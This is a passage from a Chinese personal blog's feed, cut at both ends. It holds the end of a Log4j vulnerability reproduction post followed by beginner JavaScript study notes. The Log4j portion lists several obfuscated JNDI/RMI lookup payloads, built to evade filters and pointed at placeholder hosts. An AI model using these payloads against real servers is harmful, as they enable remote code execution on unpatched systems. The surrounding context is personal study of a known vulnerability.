class="line">$&#123;$&#123;::-j&#125;ndi:rmi://asdasd.asdasd.asdasd/ass&#125;</span><br><span class="line">$&#123;jndi:rmi://adsasd.asdasd.asdasd&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://adsasd.asdasd.asdasd/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxxxxxx.xx/poc&#125;</span><br></pre></td></tr></table></figure><p>参考</p><blockquote></blockquote><p>总结 ：</p><p>1.很早就看到这个洞了，期末一天学一门真的杀我，终于有时间弄一弄这个，具体原理还不是很特别李姐，还要继续努力，寒假加油，</p><ol start="2"><li>java真xxx 为啥在本机编译的就用不了  草  还有   宝塔的防火墙，，，，佛了</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js笔记</title>
      <link href="/2021/11/22/js%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/11/22/js%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h1><hr><p>HTML 中的脚本必须位于 <code>&lt;script&gt; </code>与<code> &lt;/script&gt;</code> 标签之间。</p><p>脚本可被放置在 HTML 页面的 <code>&lt;body&gt; </code>和 <code>&lt;head&gt;</code> 部分中。</p><p>js可以自己编写</p><p>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。</p><p>外部 JavaScript 文件的文件扩展名是 .js。</p><p>如需使用外部文件，请在<code>&lt;script&gt;</code>标签的 “src” 属性中设置该 .js 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;myScript.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">#可以将脚本放置于 &lt;head&gt; 或者 &lt;body&gt;中，放在 &lt;script&gt; 标签中的脚本与外部引用的脚本运行#效果完全一致。</span><br><span class="line">myScript.js 文件代码如下：</span><br><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML=&quot;我的第一个 JavaScript 函数&quot;;</span><br><span class="line">&#125;</span><br><span class="line">#外部脚本不能包含 &lt;script&gt; 标签。</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意细节：</strong></p><p>1、在标签中填写 onclick 事件调用函数时，不是 <strong>onclick=函数名</strong>， 而是 **onclick=函数名+()**，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt; </span><br><span class="line">   function myfunction()&#123;</span><br><span class="line">        document.getElementById(&quot;demo&quot;).innerHTML=&quot;onclick事件触发&quot;;</span><br><span class="line">       &#125;&lt;/script&gt;</span><br><span class="line">   &lt;/head&gt;</span><br><span class="line">&gt;&lt;body&gt;</span><br><span class="line">   &lt;h1 id=&quot;demo&quot;&gt;一个段落&lt;/h1&gt;</span><br><span class="line">   &lt;button onclick=&quot;myfunction()&quot; type=&quot;button&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>2、外部 javascript 文件不使用 <code>&lt;script&gt;</code> 标签，直接写 javascript 代码。</p><p>3、HTML 输出流中使用 document.write，相当于添加在原有html代码中添加一串html代码。而如果在文档加载后使用（如使用函数），会覆盖整个文档。</p><p>使用函数来执行document.write代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;</span><br><span class="line">&gt;function myfunction()&#123;</span><br><span class="line">   document.write(&quot;使用函数来执行doucment.write，即在文档加载后再执行这个操作，会实现文档覆盖&quot;);</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;document.write(&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;);</span><br><span class="line">&gt;document.write(&quot;&lt;p&gt;这是一个段落。&lt;/p&gt;&quot;);</span><br><span class="line">&gt;&lt;/script&gt;</span><br><span class="line">&gt;&lt;p &gt;</span><br><span class="line">&gt;您只能在 HTML 输出流中使用 &lt;strong&gt;document.write&lt;/strong&gt;。</span><br><span class="line">&gt;如果您在文档已加载后使用它（比如在函数中），会覆盖整个文档。</span><br><span class="line">&gt;&lt;/p&gt;</span><br><span class="line">&gt;&lt;button type=&quot;button&quot; onclick=&quot;myfunction()&quot;&gt;点击这里&lt;/button&gt;</span><br></pre></td></tr></table></figure></blockquote><h1 id="JavaScript-输出"><a href="#JavaScript-输出" class="headerlink" title="JavaScript 输出"></a>JavaScript 输出</h1><hr><p>JavaScript 没有任何打印或者输出的函数。</p><h2 id="JavaScript-显示数据"><a href="#JavaScript-显示数据" class="headerlink" title="JavaScript 显示数据"></a>JavaScript 显示数据</h2><p>JavaScript 可以通过不同的方式来输出数据：</p><ul><li><p>使用 <strong>window.alert()</strong> 弹出框。</p><p><code>window.alert(5 + 6);</code></p></li><li><p>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick=&quot;myFunction()&quot;&gt;点我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">   document.write(Date());</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>使用 <strong>innerHTML</strong> 写入到 HTML 元素。</p></li><li><p>使用 <strong>console.log()</strong> 写入到浏览器的控制台。</p></li></ul><p><img src="image-20211122142414961.png" alt="image-20211122142414961"></p><h1 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h1><p>JavaScript 是一个程序语言。语法规则定义了语言结构。</p><hr><h2 id="JavaScript-语法-1"><a href="#JavaScript-语法-1" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h2><p>JavaScript 是一个脚本语言。</p><p>它是一个轻量级，但功能强大的编程语言。</p><hr><h2 id="JavaScript-字面量"><a href="#JavaScript-字面量" class="headerlink" title="JavaScript 字面量"></a>JavaScript 字面量</h2><p>在编程语言中，一般固定值称为字面量，如 3.14。</p><p><strong>数字（Number）字面量</strong> 可以是整数或者是小数，或者是科学计数(e)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = 123e5;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">12300000</span><br></pre></td></tr></table></figure><p><strong>表达式字面量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = 5 * 10;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">50</span><br></pre></td></tr></table></figure><p><strong>数组（Array）字面量</strong> 定义一个数组：</p><p><code>[40, 100, 1, 5, 25, 10]</code></p><p><strong>对象（Object）字面量</strong> 定义一个对象：</p><p><code>&#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;, age:50, eyeColor:&quot;blue&quot;&#125;</code></p><p><strong>函数（Function）字面量</strong> 定义一个函数：</p><p><code>function myFunction(a, b) &#123; return a * b;&#125;</code></p><h2 id="JavaScript-变量"><a href="#JavaScript-变量" class="headerlink" title="JavaScript 变量"></a>JavaScript 变量</h2><p>对大小写敏感</p><p>在编程语言中，变量用于存储数据值。</p><p>JavaScript 使用关键字 <strong>var</strong> 来定义变量， 使用等号来为变量赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var length;</span><br><span class="line">length = 6;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = length;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var x, y, z;</span><br><span class="line">x = 5;</span><br><span class="line">y = 6;</span><br><span class="line">z = (x + y) * 10;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = z;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">#</span><br><span class="line">110</span><br></pre></td></tr></table></figure><h2 id="JavaScript-注释"><a href="#JavaScript-注释" class="headerlink" title="JavaScript 注释"></a>JavaScript 注释</h2><p>不是所有的 JavaScript 语句都是”命令”。双斜杠 <strong>//</strong> 后的内容将会被浏览器忽略：</p><p>多行注释/*    */</p><h2 id="JavaScript-数据类型"><a href="#JavaScript-数据类型" class="headerlink" title="JavaScript 数据类型"></a>JavaScript 数据类型</h2><p>JavaScript 有多种数据类型：数字，字符串，数组，对象等等：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var length = 16;                  // Number 通过数字字面量赋值 </span><br><span class="line">var points = x * 10;               // Number 通过表达式字面量赋值</span><br><span class="line">var lastName = &quot;Johnson&quot;;             // String 通过字符串字面量赋值</span><br><span class="line">var cars = [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;];       // Array 通过数组字面量赋值</span><br><span class="line">var person = &#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;&#125;; // Object 通过对象字面量赋值</span><br></pre></td></tr></table></figure><h2 id="JavaScript-函数"><a href="#JavaScript-函数" class="headerlink" title="JavaScript 函数"></a>JavaScript 函数</h2><p>JavaScript 语句可以写在函数内，函数可以重复引用：</p><p><strong>引用一个函数</strong> = 调用函数(执行函数内的语句)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function myFunction(a, b) &#123;</span><br><span class="line">  return a * b;                // 返回 a 乘以 b 的结果</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=&quot;myPar&quot;&gt;我是一个段落。&lt;/p&gt;</span><br><span class="line">&lt;div id=&quot;myDiv&quot;&gt;我是一个div。&lt;/div&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction()&#123;</span><br><span class="line">    document.getElementById(&quot;myPar&quot;).innerHTML=&quot;你好世界！&quot;;</span><br><span class="line">    document.getElementById(&quot;myDiv&quot;).innerHTML=&quot;你最近怎么样?&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p&gt;当您点击上面的按钮时，两个元素会改变。&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>JavaScript 会忽略多余的空格。</p><h2 id="对代码行进行折行"><a href="#对代码行进行折行" class="headerlink" title="对代码行进行折行"></a>对代码行进行折行</h2><p>您可以在文本字符串中使用反斜杠对代码行进行换行。下面的例子会正确地显示：</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><code>document.write(&quot;你好 \ 世界!&quot;);</code></p><h1 id="JavaScript-数据类型-1"><a href="#JavaScript-数据类型-1" class="headerlink" title="JavaScript 数据类型"></a>JavaScript 数据类型</h1><hr><p>**值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。</p><p><strong>引用数据类型</strong>：对象(Object)、数组(Array)、函数(Function)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">下面的代码创建名为 cars 的数组：</span><br><span class="line"></span><br><span class="line">var cars=new Array();</span><br><span class="line">cars[0]=&quot;Saab&quot;;</span><br><span class="line">cars[1]=&quot;Volvo&quot;;</span><br><span class="line">cars[2]=&quot;BMW&quot;;</span><br><span class="line">或者 (condensed array):</span><br><span class="line"></span><br><span class="line">var cars=new Array(&quot;Saab&quot;,&quot;Volvo&quot;,&quot;BMW&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">JavaScript 对象</span><br><span class="line">对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔：</span><br><span class="line">对象也是一个变量，但对象可以包含多个值（多个变量），每个值以 name:value 对呈现。</span><br><span class="line">var person=&#123;firstname:&quot;John&quot;, lastname:&quot;Doe&quot;, id:5566&#125;;</span><br><span class="line">上面例子中的对象 (person) 有三个属性：firstname、lastname 以及 id。</span><br><span class="line"></span><br><span class="line">空格和折行无关紧要。声明可横跨多行：</span><br><span class="line"></span><br><span class="line">var person=&#123;</span><br><span class="line">firstname : &quot;John&quot;,</span><br><span class="line">lastname  : &quot;Doe&quot;,</span><br><span class="line">id        :  5566</span><br><span class="line">&#125;;</span><br><span class="line">对象属性有两种寻址方式：\</span><br><span class="line">name=person.lastname;</span><br><span class="line">name=persion[&quot;lastname&quot;];</span><br><span class="line">Undefined 和 Null</span><br><span class="line">Undefined 这个值表示变量不含有值。</span><br><span class="line"></span><br><span class="line">可以通过将变量的值设置为 null 来清空变量。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">cars=null;</span><br><span class="line">person=null;</span><br><span class="line">声明变量类型</span><br><span class="line">当您声明新变量时，可以使用关键词 &quot;new&quot; 来声明其类型：</span><br><span class="line"></span><br><span class="line">var carname=new String;</span><br><span class="line">var x=      new Number;</span><br><span class="line">var y=      new Boolean;</span><br><span class="line">var cars=   new Array;</span><br><span class="line">var person= new Object;</span><br></pre></td></tr></table></figure><h2 id="JavaScript-函数语法"><a href="#JavaScript-函数语法" class="headerlink" title="JavaScript 函数语法"></a>JavaScript 函数语法</h2><p>函数就是包裹在花括号中的代码块，前面使用了关键词 function：</p><p>function <em>functionname</em>()<br>{<br>  <em>// 执行代码</em><br>}</p><p>当调用该函数时，会执行函数内的代码。</p><p>可以在某事件发生时直接调用函数（比如当用户点击按钮时），并且可由 JavaScript 在任何位置进行调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaScript 对大小写敏感。关键词 function 必须是小写的，并且必须以与函数名称相同的大小写来调用函数。</span><br></pre></td></tr></table></figure><h1 id="JavaScript-事件"><a href="#JavaScript-事件" class="headerlink" title="JavaScript 事件"></a>JavaScript 事件</h1><hr><p>HTML 事件是发生在 HTML 元素上的事情。</p><p>当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。</p><hr><h2 id="HTML-事件"><a href="#HTML-事件" class="headerlink" title="HTML 事件"></a>HTML 事件</h2><p>HTML 事件可以是浏览器行为，也可以是用户行为。</p><p>以下是 HTML 事件的实例：</p><ul><li>HTML 页面完成加载</li><li>HTML input 字段改变时</li><li>HTML 按钮被点击</li></ul><p>通常，当事件发生时，你可以做些事情。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在事件触发时 JavaScript 可以执行一些代码。</span><br><span class="line"></span><br><span class="line">HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。</span><br><span class="line"></span><br><span class="line">通常，当事件发生时，你可以做些事情。</span><br><span class="line"></span><br><span class="line">在事件触发时 JavaScript 可以执行一些代码。</span><br><span class="line"></span><br><span class="line">HTML 元素中可以添加事件属性，使用 JavaScript 代码来添加 HTML 元素。</span><br></pre></td></tr></table></figure><h1 id="JavaScript-字符串"><a href="#JavaScript-字符串" class="headerlink" title="JavaScript 字符串"></a>JavaScript 字符串</h1><hr><p>JavaScript 字符串用于存储和处理文本。</p><p>可以是插入到引号中的任何字符。你可以使用单引号或双引号：</p><p>也可以在字符串添加转义字符来使用引号：反斜杠</p><p>var x = ‘It&#39;s alright’;<br>var y = “He is called &quot;Johnny&quot;“;</p><p><img src="image-20211122145140962.png" alt="image-20211122145140962"></p><p>更多方法实例可以参见：<a href="https://www.runoob.com/jsref/jsref-obj-string.html">JavaScript String 对象</a>。</p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">charAt()</td><td align="left">返回指定索引位置的字符</td></tr><tr><td align="left">charCodeAt()</td><td align="left">返回指定索引位置字符的 Unicode 值</td></tr><tr><td align="left">concat()</td><td align="left">连接两个或多个字符串，返回连接后的字符串</td></tr><tr><td align="left">fromCharCode()</td><td align="left">将 Unicode 转换为字符串</td></tr><tr><td align="left">indexOf()</td><td align="left">返回字符串中检索指定字符第一次出现的位置</td></tr><tr><td align="left">lastIndexOf()</td><td align="left">返回字符串中检索指定字符最后一次出现的位置</td></tr><tr><td align="left">localeCompare()</td><td align="left">用本地特定的顺序来比较两个字符串</td></tr><tr><td align="left">match()</td><td align="left">找到一个或多个正则表达式的匹配</td></tr><tr><td align="left">replace()</td><td align="left">替换与正则表达式匹配的子串</td></tr><tr><td align="left">search()</td><td align="left">检索与正则表达式相匹配的值</td></tr><tr><td align="left">slice()</td><td align="left">提取字符串的片断，并在新的字符串中返回被提取的部分</td></tr><tr><td align="left">split()</td><td align="left">把字符串分割为子字符串数组</td></tr><tr><td align="left">substr()</td><td align="left">从起始索引号提取字符串中指定数目的字符</td></tr><tr><td align="left">substring()</td><td align="left">提取字符串中两个指定的索引号之间的字符</td></tr><tr><td align="left">toLocaleLowerCase()</td><td align="left">根据主机的语言环境把字符串转换为小写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td align="left">toLocaleUpperCase()</td><td align="left">根据主机的语言环境把字符串转换为大写，只有几种语言（如土耳其语）具有地方特有的大小写映射</td></tr><tr><td align="left">toLowerCase()</td><td align="left">把字符串转换为小写</td></tr><tr><td align="left">toString()</td><td align="left">返回字符串对象值</td></tr><tr><td align="left">toUpperCase()</td><td align="left">把字符串转换为大写</td></tr><tr><td align="left">trim()</td><td align="left">移除字符串首尾空白</td></tr><tr><td align="left">valueOf()</td><td align="left">返回某个字符串对象的原始值</td></tr></tbody></table><h1 id="JavaScript-运算符"><a href="#JavaScript-运算符" class="headerlink" title="JavaScript 运算符"></a>JavaScript 运算符</h1><hr><p><strong>运算符 = 用于赋值。</strong></p><p><strong>运算符 + 用于加值。</strong></p><h2 id="用于字符串的-运算符"><a href="#用于字符串的-运算符" class="headerlink" title="用于字符串的 + 运算符"></a>用于字符串的 + 运算符</h2><p>+ 运算符用于把文本值或字符串变量加起来（连接起来）。</p><p>如需把两个或多个字符串变量连接起来，请使用 + 运算符。</p><h2 id="对字符串和数字进行加法运算"><a href="#对字符串和数字进行加法运算" class="headerlink" title="对字符串和数字进行加法运算"></a>对字符串和数字进行加法运算</h2><p>两个数字相加，返回数字相加的和，如果数字与字符串相加，返回字符串，如下实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x=5+5;</span><br><span class="line">y=&quot;5&quot;+5;</span><br><span class="line">z=&quot;Hello&quot;+5;</span><br><span class="line"></span><br><span class="line">*x*,*y*, 和 *z* 输出结果为:</span><br><span class="line"></span><br><span class="line">10</span><br><span class="line">55</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure><h1 id="JavaScript-比较-和-逻辑运算符"><a href="#JavaScript-比较-和-逻辑运算符" class="headerlink" title="JavaScript 比较 和 逻辑运算符"></a>JavaScript 比较 和 逻辑运算符</h1><p>比较和逻辑运算符用于测试 <em>true</em> 或者 <em>false</em>。</p><hr><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>比较运算符在逻辑语句中使用，以测定变量或值是否相等。</p><p>x=5，下面的表格解释了比较运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">比较</th><th align="left">返回值</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">等于</td><td align="left">x==8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison1">实例 »</a></td></tr><tr><td align="left">x==5</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison2">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">===</td><td align="left">绝对等于（值和类型均相等）</td><td align="left">x===”5”</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison3">实例 »</a></td></tr><tr><td align="left">x===5</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison4">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">!=</td><td align="left">不等于</td><td align="left">x!=8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison5">实例 »</a></td></tr><tr><td align="left">!==</td><td align="left">不绝对等于（值和类型有一个不相等，或两个都不相等）</td><td align="left">x!==”5”</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison6">实例 »</a></td></tr><tr><td align="left">x!==5</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison7">实例 »</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">&gt;</td><td align="left">大于</td><td align="left">x&gt;8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison8">实例 »</a></td></tr><tr><td align="left">&lt;</td><td align="left">小于</td><td align="left">x&lt;8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison9">实例 »</a></td></tr><tr><td align="left">&gt;=</td><td align="left">大于或等于</td><td align="left">x&gt;=8</td><td align="left"><em>false</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison10">实例 »</a></td></tr><tr><td align="left">&lt;=</td><td align="left">小于或等于</td><td align="left">x&lt;=8</td><td align="left"><em>true</em></td><td align="left"><a href="https://www.runoob.com/try/try.php?filename=tryjs_comparison11">实例 »</a></td></tr></tbody></table><hr><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>可以在条件语句中使用比较运算符对值进行比较，然后根据结果来采取行动：</p><p>if (age&lt;18) x=”Too young”;</p><p>您将在本教程的下一节中学习更多有关条件语句的知识。</p><hr><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符用于测定变量或值之间的逻辑。</p><p>给定 x=6 以及 y=3，下表解释了逻辑运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">and</td><td align="left">(x &lt; 10 &amp;&amp; y &gt; 1) 为 true</td></tr><tr><td align="left">||</td><td align="left">or</td><td align="left">(x==5 || y==5) 为 false</td></tr><tr><td align="left">!</td><td align="left">not</td><td align="left">!(x==y) 为 true</td></tr></tbody></table><hr><h2 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h2><p>JavaScript 还包含了基于某些条件对变量进行赋值的条件运算符。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><em>variablename</em>=(<em>condition</em>)?<em>value1</em>:<em>value2</em> </p><p>如果变量 age 中的值小于 18，则向变量 voteable 赋值 “年龄太小”，否则赋值 “年龄已达到”。</p><p><code>voteable=(age&lt;18)?&quot;年龄太小&quot;:&quot;年龄已达到&quot;;</code></p><h1 id="JavaScript-if…Else-语句"><a href="#JavaScript-if…Else-语句" class="headerlink" title="JavaScript if…Else 语句"></a>JavaScript if…Else 语句</h1><p>和其他语言相近</p><h1 id="JavaScript-for-循环"><a href="#JavaScript-for-循环" class="headerlink" title="JavaScript for 循环"></a>JavaScript for 循环</h1><hr><p>循环可以将代码块执行指定的次数。</p><h2 id="For-In-循环"><a href="#For-In-循环" class="headerlink" title="For/In 循环"></a>For/In 循环</h2><p>JavaScript for/in 语句循环遍历对象的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var person=&#123;fname:&quot;Bill&quot;,lname:&quot;Gates&quot;,age:56&#125;;   for (x in person)  // x 为属性名 &#123;    txt=txt + person[x]; &#125;</span><br></pre></td></tr></table></figure><h1 id="JavaScript-while-循环"><a href="#JavaScript-while-循环" 